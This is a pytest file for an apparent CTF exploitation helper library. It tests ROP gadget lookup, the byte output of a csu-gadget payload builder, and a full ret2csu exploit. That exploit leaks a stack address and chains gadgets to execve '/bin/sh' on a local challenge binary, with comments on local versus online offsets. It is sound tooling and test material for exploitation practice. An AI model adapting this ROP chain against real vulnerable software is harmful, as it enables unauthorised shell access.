from .common import get_elf_resources
from sgtlibc.utils.shell import check_shell_validate
import platform
import sgtlibc
import sgtlibc.ROPgadgets
import sgtlibc.gamebox
import pytest
from .common import get_elf_resources


@pytest.mark.skipif(platform.uname()[0] == 'Windows', reason='skip windows')
@pytest.mark.skipif(platform.uname()[0] == 'Darwin', reason='skip mac')
def test_rop_get():
    path = get_elf_resources('pwn1')
    elf = sgtlibc.ROPgadgets.ELF(path)
    data = elf.get_rop()

    assert 'ret' in data and data['ret'] == 0x4005d9
    assert 'rdi' in data and data['rdi'] == 0x400a03


csu_data = b'&\x12\x00\x00\x00\x00\x00\x00\xde\xad\xbe\xef\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x12\x00\x00\x00\x00\x00\x00\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde\xde\xad\xbe\xef\xef\xbe\xad\xde!C\x00\x00\x00\x00\x00\x00'


def test_rop_gadgets_csu():
    data = sgtlibc.gamebox.gadgets.gadget_by_csu(0x11d0, 0x1, 0, 0, 0, 0x4321)
    data = sgtlibc.gamebox.gadgets.build(data)
    assert csu_data == data


def test_rop_gadgets_csu_by_build():
    data = sgtlibc.gamebox.gadgets.build(
        'gadget_by_csu', 0x11d0, 0x1, 0, 0, 0, 0x4321)
    assert csu_data == data


@pytest.mark.skipif(platform.uname()[0] == 'Windows', reason='skip windows')
@pytest.mark.skipif(platform.uname()[0] == 'Darwin', reason='skip mac')
def test_ret2csu():
    elf = get_elf_resources('ret2csu')
    g = sgtlibc.gamebox
    g.set_config(g.GameBoxConfig(
        is_local=True,
        file=elf,
        auto_load=True,
        auto_show_rop=True,
        auto_show_summary=True,
        auto_start_game=True,
        auto_load_shell_str=True,
        auto_show_symbols=True
    ))

    s = sgtlibc.Searcher()
    elf = g.client.elf

    main_addr = elf.symbols['main']
    csu_init_addr = elf.symbols['__libc_csu_init']

    rax_59_ret = 0x04004E2
    syscall = 0x0400517
    payload = b'/bin/sh\x00' + g.fakeebp() + g.p00(main_addr)
    g.sl(payload)
    g.rc(0x20)  # buf size
    stack_addr = g.u00(g.rc(6))  # leak current ebp
    # binsh_addr = stack_addr - 0x138 # 线上则是0x138
    binsh_addr = stack_addr - 0x148  # 本地运行需要 -0x148
    rax_59 = binsh_addr + 0x10
    pop_rdi = 0x04005a3
    g.log.info(f'stack_addr:{hex(stack_addr)}')
    g.log.info(f'binsh_addr:{hex(binsh_addr)}')
    g.log.info(f'rax_59:{hex(rax_59)}')

    payload = b'/bin/sh\x00' + g.fakeebp() + g.p00(rax_59_ret)
    payload += g.gadgets.build('gadget_by_csu', csu_init_addr, rax_59, 0, 0, 0)
    payload += g.p00(pop_rdi)
    payload += g.p00(binsh_addr)
    payload += g.p00(syscall)
    g.sl(payload)
    check_shell_validate(g)
